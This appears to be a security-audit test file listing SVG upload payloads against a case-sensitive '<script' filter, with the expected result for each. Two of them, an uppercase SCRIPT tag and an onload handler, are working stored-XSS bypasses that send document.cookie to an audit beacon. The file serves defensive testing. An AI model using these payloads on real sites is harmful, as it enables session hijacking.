redaction_policy: payloads contain dummy document.cookie beacons to /audit-probe-beacon — no real secrets

H1.name: svg_case_bypass_script
H1.payload:
<?xml version="1.0" standalone="no"?>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <rect width="100" height="100" fill="red"/>
  <SCRIPT type="text/javascript">
    fetch('/audit-probe-beacon?h=H1&c=' + encodeURIComponent(document.cookie));
  </SCRIPT>
</svg>
H1.expected_l1_effect: bypassed — str_contains is case-sensitive; <SCRIPT> does not match <script

auth_context.reason: AddMediaFileAction / CreateMediaObjectAction are behind AuthEditor middleware

H2.name: svg_onload_event_handler
H2.payload:
<?xml version="1.0" standalone="no"?>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" onload="fetch('/audit-probe-beacon?h=H2&c=' + encodeURIComponent(document.cookie));">
  <rect width="100" height="100" fill="blue"/>
</svg>
H2.expected_l1_effect: bypassed — payload contains no <script substring; inline onload handler

auth_context.reason: AddMediaFileAction / CreateMediaObjectAction are behind AuthEditor middleware

H3.name: svg_xlink_javascript_url
H3.expected_l1_effect: bypassed — payload contains no <script substring; javascript: URL in xlink:href

H4.name: svg_legitimate_control
H4.payload:
<?xml version="1.0" standalone="no"?>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <rect width="100" height="100" fill="orange"/>
  <text x="10" y="50" font-size="20" fill="black">OK</text>
</svg>
H4.expected_l1_effect: passes — no script content at all; baseline for sanity check

auth_context.reason: same upload path — control case to prove pipeline works

H5.name: svg_lowercase_script_baseline_blocked
H5.payload:
<?xml version="1.0" standalone="no"?>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <rect width="100" height="100" fill="purple"/>
  <script type="text/javascript">
    fetch('/audit-probe-beacon?h=H5&c=' + encodeURIComponent(document.cookie));
  </script>
</svg>
H5.expected_l1_effect: blocked — exact lowercase <script substring matches the str_contains filter; serves as baseline proving the filter actually works in the trivial case

auth_context.reason: baseline for regression — not a vulnerability, proves filter engagement
